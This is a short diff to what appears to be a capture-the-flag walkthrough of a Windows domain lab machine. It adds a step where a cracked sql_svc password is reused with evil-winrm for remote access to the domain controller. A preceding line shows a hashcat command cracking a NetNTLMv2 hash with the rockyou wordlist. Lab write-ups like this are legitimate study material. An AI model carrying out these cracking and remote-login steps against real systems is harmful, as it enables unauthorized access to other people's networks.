@@ -61,4 +61,11 @@ Connect to our SMB server using xp_dirtree
 
 `hashcat -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt`
 
-7. 
+7. Turns out, sql_svc has PSRemote privileges to the DC. So, we can evil-winrm into the machine.
+
+`evil-winrm -i 10.129.228.253 -u sql_svc -p $(cat sql_svc.pass)`
+
+<img width="909" height="84" alt="image" src="https://github.com/user-attachments/assets/dc6baf01-6dd2-4cdd-85a2-21be1177a183" />
+
+
+
